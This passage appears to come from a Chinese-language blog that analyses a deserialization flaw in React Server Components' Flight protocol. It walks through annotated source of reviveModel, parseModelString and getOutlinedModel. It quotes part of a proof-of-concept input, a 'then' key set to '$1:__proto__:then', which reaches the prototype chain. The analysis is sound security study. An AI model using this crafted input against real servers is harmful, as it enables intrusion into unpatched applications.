</span></span></span><span class="line"><span class="cl"><span class="cm"> * 4. 清理还原失败的属性，保证模型数据合法性；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 5. 是 Flight 协议反序列化中「JSON数据 → 组件模型」的核心递归逻辑。
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {Response} response - RSC/Flight协议响应对象，含临时引用缓存等核心属性
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {any} parentObj - 当前值的父对象/数组
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {string} parentKey - 当前值在父对象/数组中的键/索引
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {JSONValue} value - 待还原的原始JSON值（字符串/对象/数组/数字/布尔/null）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {void | string} reference - 当前值的Flight协议引用标识
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @returns {any} - 还原后的模型数据（组件模型/结构化数据/基础类型）
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">reviveModel</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="nx">response</span><span class="o">:</span> <span class="nx">Response</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">parentObj</span><span class="o">:</span> <span class="nx">any</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">parentKey</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">value</span><span class="o">:</span> <span class="nx">JSONValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">reference</span><span class="o">:</span> <span class="k">void</span> <span class="o">|</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">:</span> <span class="nx">any</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 分支1：字符串类型 → 解析Flight协议特殊标记字符串 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 注释：不能用.bind绑定this，因为parseModelString需要当前上下文的this值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 核心：调用parseModelString解析$开头的特殊字符串（如$F表示服务端组件引用）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">parseModelString</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">parentObj</span><span class="p">,</span> <span class="nx">parentKey</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">reference</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 分支2：非空对象/数组类型 → 递归还原 + 引用注册 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="s1">&#39;object&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">value</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 注册临时引用：若存在引用标识且响应有临时引用缓存，绑定对象与引用（解决循环引用）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="nx">reference</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">response</span><span class="p">.</span><span class="nx">_temporaryReferences</span> <span class="o">!==</span> <span class="kc">undefined</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 存储对象的引用标识，防止后续返回时重复解析
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">registerTemporaryReference</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">response</span><span class="p">.</span><span class="nx">_temporaryReferences</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">reference</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 子分支1：数组类型 → 递归还原每个元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="err">……</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 子分支2：普通对象类型 → 递归还原每个自有属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">// [3] 遍历对象属性  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 仅处理对象自有属性（排除原型链属性，避免污染）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">hasOwnProperty</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 生成子属性的引用标识：父引用 + 属性名（跳过含&#34;:&#34;的特殊键）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="kr">const</span> <span class="nx">childRef</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reference</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">key</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">              <span class="o">?</span> <span class="nx">reference</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nx">key</span>
</span></span><span class="line"><span class="cl">              <span class="o">:</span> <span class="kc">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 递归还原当前属性值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="kr">const</span> <span class="nx">newValue</span> <span class="o">=</span> <span class="nx">reviveModel</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nx">response</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="nx">childRef</span>
</span></span><span class="line"><span class="cl">          <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="c1">// 处理还原结果：有效则赋值，无效则删除属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">if</span> <span class="p">(</span><span class="nx">newValue</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">newValue</span><span class="p">;</span>  <span class="c1">// 用解析后的对象替换原字符串  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 还原失败（返回undefined），删除该属性保证模型数据合法性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">delete</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 分支3：基础类型（数字/布尔/null）→ 直接返回原值 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>
<p><strong>递归还原的设计核心</strong>：函数采用深度递归遍历对象 / 数组，保证嵌套层级的模型数据（如嵌套组件、多维数组）都能被完整还原 —— 这是 Flight 协议处理复杂组件模型的基础。</p>
</li>
<li>
<p><strong>临时引用的核心作用</strong>：<code>registerTemporaryReference</code> 将对象与 <code>reference</code> 绑定，存储在 <code>response._temporaryReferences</code>（Map 结构）中：</p>
<ul>
<li>解决循环引用：A 引用 B、B 又引用 A 时，能通过引用标识找到已还原的对象，避免死循环；</li>
<li>跨模型引用：不同模型块之间的对象引用，能通过统一的引用标识关联。</li>
</ul>
</li>
<li>
<p><strong>引用标识的生成规则</strong>：引用标识格式为 <code>父引用:子键</code>（如 <code>123:0:title</code>），其中：</p>
<ul>
<li>
<p><code>123</code>：根模型块 ID；</p>
</li>
<li>
<p><code>0</code>：数组索引；</p>
</li>
<li>
<p><code>title</code>：对象属性名；</p>
<p>跳过含 <code>:</code> 的键，避免与引用标识格式冲突。</p>
</li>
</ul>
</li>
<li>
<p><strong>无效属性清理的意义</strong>：还原结果为 <code>undefined</code> 时删除对应属性，避免：</p>
<ul>
<li>原型链污染（如还原 <code>__proto__</code> 属性失败时直接删除）；</li>
<li>无效数据干扰组件渲染（如未解析的模块引用）。</li>
</ul>
</li>
<li>
<p><strong>Flow 注释的背景</strong>：<code>$FlowFixMe[cannot-write]</code> 是 Facebook Flow 类型检查的兼容注释，原代码中用于忽略「修改只读对象」的类型警告 —— 因为 Flight 协议内部直接修改序列化数据以提升解析效率，而非创建新对象</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">reviveModel</span><span class="p">(...)</span><span class="o">:</span> <span class="nx">any</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">  <span class="p">...</span>  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="s1">&#39;object&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">value</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">    <span class="p">...</span>  
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>    <span class="c1">// [3] 遍历对象属性  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="nx">hasOwnProperty</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">))</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">newValue</span> <span class="o">=</span> <span class="nx">reviveModel</span><span class="p">(</span>  
</span></span><span class="line"><span class="cl">          <span class="nx">response</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">childRef</span><span class="p">,</span>  
</span></span><span class="line"><span class="cl">        <span class="p">);</span>  
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">newValue</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">          <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">newValue</span><span class="p">;</span>  <span class="c1">// 用解析后的对象替换原字符串  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">      <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>POC 中 <code>chunk[0].value</code> 经 JSON 解析后为 object 类型，进入 <strong>[3]</strong> 处的循环，遍历所有 key-value 并递归调用 <code>reviveModel</code>。这是反序列化的核心过程——将数据还原为实际对象。</p>
<p>当遇到第一个 key <code>then</code>，其值为 <code>$1:__proto__:then</code>（字符串类型），会走不同分支：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">reviveModel</span><span class="p">(...)</span><span class="o">:</span> <span class="nx">any</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">parseModelString</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">parentObj</span><span class="p">,</span> <span class="nx">parentKey</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">reference</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl">  <span class="p">...</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="字符串解析parsemodelstring" class="heading-element"><span>字符串解析：parseModelString</span>
  <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e8%a7%a3%e6%9e%90parsemodelstring" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><code>parseModelString</code> 包含一个大型 switch 表，根据前缀字符路由到不同处理逻辑：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Flight 协议：解析模型特殊标记字符串的核心函数，核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 解析 Flight 协议约定的以 $ 开头的特殊标记字符串，转换为对应 JS 实体/协议对象；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 按二级标记（$ 后第二个字符）分支处理，覆盖基础类型、集合类型、二进制类型、协议核心类型；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 实现服务端组件引用加载、临时引用创建、表单数据提取、流式数据解析等 Flight 协议专属逻辑；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 4. 普通字符串直接返回，是 Flight 协议反序列化中「字符串 → 实体」的关键转换层。
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {Response} response - RSC/Flight 协议响应对象，包含_formData（表单数据）、_prefix（协议前缀）、临时引用缓存等核心属性
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {Object} obj - 当前字符串所属的父对象（用于关联属性归属）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {string} key - 当前字符串在父对象中的属性键（如对象属性名）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {string} value - 待解析的 Flight 协议特殊标记字符串（以 $ 开头）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {void | string} reference - 当前字符串对应的 Flight 协议引用标识
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @returns {any} - 解析后的 JS 实体/协议对象（如 FormData、Date、TypedArray、组件引用等），普通字符串直接返回原值
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseModelString</span><span class="p">(...)</span><span class="o">:</span> <span class="nx">any</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 核心分支：仅处理以 $ 开头的 Flight 协议特殊标记字符串 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 第一组二级标记解析：基础类型/协议核心类型 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">switch</span> <span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">      <span class="c1">// 标记 $$：转义 $ 字符 → 移除第一个 $ 后返回
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">case</span> <span class="s1">&#39;$&#39;</span><span class="o">:</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">      <span class="p">}</span>  
</span></span><span class="line"><span class="cl">      <span class="c1">// 标记 $@：Promise 模型块 → 解析 16 进制 ID 并获取对应模型块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">case</span> <span class="s1">&#39;@&#39;</span><span class="o">:</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">        <span class="c1">// Promise 引用  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>  <span class="c1">// 截取 $@ 后内容，转为 16 进制 ID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>     <span class="c1">// [4] 从响应中获取该 ID 对应的模型块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">chunk</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">      <span class="p">}</span>  
</span></span><span class="line"><span class="cl">      <span class="p">...</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 兜底处理：未匹配二级标记的特殊字符串 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 默认：chunk 引用，移除开头的 $
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">ref</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="c1">// 解析为通用模型（Outlined Model）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">getOutlinedModel</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">ref</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">createModel</span><span class="p">);</span>  <span class="c1">// [5]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>该函数是 <strong>RSC Flight 协议体系下解析模型特殊标记字符串的核心函数</strong>，是 Flight 协议反序列化中「<code>$</code> 开头的协议标记字符串 → 对应 JS 实体 / 组件模型」的关键转换层。核心功能可拆解为：</p>
<ol>
<li><strong>特殊前缀识别</strong>：仅处理以 <code>$</code> 开头的 Flight 协议标记字符串，普通字符串直接返回；</li>
<li>二级标记分支解析</li>
<li>按 <code>$</code> 后的第二个字符（如 <code>@/F/T/D</code> 等），将标记字符串解析为对应类型的 JS 实体：
基础类型：Infinity、-0、-Infinity、NaN、undefined、Date、BigInt；
集合类型：Map、Set、FormData、Iterator；
二进制 / 数组类型：各类 TypedArray（Int8Array/Uint8Array 等）、ArrayBuffer、DataView、Blob；
协议核心类型：Promise 模型块、服务端组件引用、临时引用、可读流（ReadableStream）、异步可迭代对象；</li>
<li>兜底处理：未匹配二级标记的特殊字符串，解析为通用模型引用；</li>
</ol>
<p>整体覆盖了 Flight 协议约定的所有特殊字符串类型，是「序列化标记字符串 → 可运行 JS 实体」的核心解析器，支撑 RSC 组件模型的完整还原。</p>
<h4 id="引用解析getoutlinedmodel" class="heading-element"><span>引用解析：getOutlinedModel</span>
  <a href="#%e5%bc%95%e7%94%a8%e8%a7%a3%e6%9e%90getoutlinedmodel" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">getOutlinedModel</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(...)</span><span class="o">:</span> <span class="nx">T</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">reference</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">);</span>  <span class="c1">// 按 : 分割路径  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">path</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">  <span class="p">...</span>  
</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">    <span class="p">...</span>  
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nx">PENDING</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nx">BLOCKED</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nx">CYCLIC</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">parentChunk</span> <span class="o">=</span> <span class="nx">initializingChunk</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">      <span class="nx">chunk</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span>  <span class="c1">// [6] 注册回调  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">createModelResolver</span><span class="p">(...),</span>  
</span></span><span class="line"><span class="cl">        <span class="nx">createModelReject</span><span class="p">(</span><span class="nx">parentChunk</span><span class="p">),</span>  
</span></span><span class="line"><span class="cl">      <span class="p">);</span>  
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">(</span><span class="kc">null</span><span class="o">:</span> <span class="nx">any</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">;</span>  
